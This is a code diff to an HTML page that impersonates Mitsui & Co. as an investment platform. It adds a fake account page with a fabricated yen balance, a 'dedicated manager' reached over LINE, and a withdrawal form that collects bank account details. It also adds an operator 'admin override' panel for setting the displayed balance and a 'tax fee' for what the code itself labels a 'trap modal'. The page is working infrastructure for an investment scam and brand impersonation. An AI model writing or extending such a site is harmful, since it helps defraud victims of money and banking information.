@@ -96,7 +96,7 @@
 </head>
 <body>
 
-    <!-- LOGIN PAGE - Mitsui smaller & single line -->
+    <!-- LOGIN PAGE -->
     <div id="login-page">
         <div class="login-card">
             <div class="brand-title">MITSUI & CO., LTD.</div>
@@ -188,20 +188,77 @@
 
             <!-- Account & Withdraw pages unchanged -->
             <div id="page-account" style="display:none;">
-                <!-- your previous code here -->
+                <h3 style="margin-bottom: 25px;">Personal Information <span style="font-weight: normal; color: #777;">| 個人情報</span></h3>
+                <div class="card">
+                    <div style="display:grid; grid-template-columns: repeat(auto-fit, minmax(220px, 1fr)); gap:20px; font-size:15px;">
+                        <div><label style="color:#777; display:block; margin-bottom:6px;">Name</label><p id="p-name">田中 太郎 (Tanaka Taro)</p></div>
+                        <div><label style="color:#777; display:block; margin-bottom:6px;">Account Number</label><p>MITSUI-VIP-2026-47291</p></div>
+                        <div><label style="color:#777; display:block; margin-bottom:6px;">Status</label><p><span class="badge-active">ACTIVE & VERIFIED</span></p></div>
+                        <div><label style="color:#777; display:block; margin-bottom:6px;">Tier</label><p>GOLD VIP MEMBER</p></div>
+                        <div><label style="color:#777; display:block; margin-bottom:6px;">Registration Date</label><p>2026年2月1日</p></div>
+                        <div><label style="color:#777; display:block; margin-bottom:6px;">Email</label><p id="p-email">tanaka.taro@example.com</p></div>
+                    </div>
+                </div>
+
+                <div class="card" style="border-left: 5px solid var(--mitsui-blue);">
+                    <h4>Your Dedicated Manager</h4>
+                    <div style="display:flex; align-items:center; gap:20px; margin-top:18px; flex-wrap:wrap;">
+                        <div style="width:70px; height:70px; border-radius:50%; background:#eee; display:flex; align-items:center; justify-content:center; font-size:28px; color:#555;"><i class="fa-solid fa-user-tie"></i></div>
+                        <div>
+                            <p style="font-size:18px; font-weight:600;">Kazumasa Nakai</p>
+                            <p style="font-size:13px; color:#777;">Senior Investment Manager</p>
+                            <a href="https://line.me/R/ti/p/7u8Tnjzq4r" target="_blank" style="color: var(--mitsui-blue); text-decoration: none; font-weight:600; display:inline-flex; align-items:center; gap:8px; margin-top:8px;">
+                                <i class="fa-brands fa-line" style="font-size:20px; color:#00b900;"></i> Contact / Add on LINE
+                            </a>
+                        </div>
+                    </div>
+                </div>
             </div>
 
             <div id="page-withdraw" style="display:none;">
-                <!-- your previous code here -->
+                <h3>Withdrawal Request <span style="font-weight:normal; color:#777;">| 出金リクエスト</span></h3>
+                <div class="card">
+                    <p style="color:#777; font-size:13px; margin-bottom:8px;">Available Balance</p>
+                    <h2 id="w-avail-display">¥3,847,520</h2>
+                    <hr style="margin:25px 0; border:0; border-top:1px solid #eee;">
+                    <label>Withdrawal Amount (JPY)</label>
+                    <input type="number" id="withdraw-amount" class="login-input" placeholder="Enter amount">
+                    <label>Bank Name</label>
+                    <input type="text" id="bank-name" class="login-input" placeholder="e.g., 三菱UFJ銀行">
+                    <label>Account Number</label>
+                    <input type="text" id="account-number" class="login-input" placeholder="Enter your account number">
+                    <label>Account Holder Name</label>
+                    <input type="text" id="account-holder" class="login-input" placeholder="Enter name">
+                    <button class="btn-login" style="margin-top:20px;" onclick="submitWithdraw()">SUBMIT WITHDRAWAL REQUEST</button>
+                </div>
             </div>
         </main>
     </div>
 
-    <!-- Success modal & Admin panel unchanged -->
-    <!-- ... (same as your last version) ... -->
+    <div id="success-modal" class="modal">
+        <div class="modal-content">
+            <i class="fa-solid fa-check-circle" style="font-size:60px; color:var(--success-green); margin-bottom:20px;"></i>
+            <h2>Withdrawal Request Submitted</h2>
+            <p style="margin:20px 0; color:#555;">Your request has been received and is now pending approval.<br>Processing time: 24-48 hours.<br>You will be notified via your dedicated manager.</p>
+            <button class="btn-login" style="background:#555; width:auto; padding:12px 40px;" onclick="closeSuccessModal()">Back to Dashboard</button>
+        </div>
+    </div>
+
+    <div id="admin-panel">
+        <h3><i class="fa-solid fa-gears"></i> ADMIN OVERRIDE PANEL (Real-time)</h3>
+        <div style="display:grid; grid-template-columns: repeat(auto-fit, minmax(220px, 1fr)); gap:15px; margin-top:25px;">
+            <div><label>User Name:</label><input type="text" id="adm-name" class="admin-input" value="田中 太郎"></div>
+            <div><label>Total Balance (¥):</label><input type="number" id="adm-bal" class="admin-input" value="3847520"></div>
+            <div><label>Initial Investment (¥):</label><input type="number" id="adm-init" class="admin-input" value="3000000"></div>
+            <div><label>Tax Fee % (for trap modal):</label><input type="number" step="0.1" id="adm-tax" class="admin-input" value="20.4"></div>
+        </div>
+        <div style="margin-top:25px;">
+            <button class="btn-login" style="background:var(--success-green); width:auto; padding:12px 35px; margin-right:15px;" onclick="applyAdmin()">APPLY CHANGES</button>
+            <button class="btn-login" style="background:#555; width:auto; padding:12px 35px;" onclick="adminTrigger()">CLOSE</button>
+        </div>
+    </div>
 
     <script>
-        // === YOUR WORKING SCRIPT (unchanged) ===
         let currentBalance = 3847520;
         let initialDeposit = 3000000;
         let todayProfit = 67420;
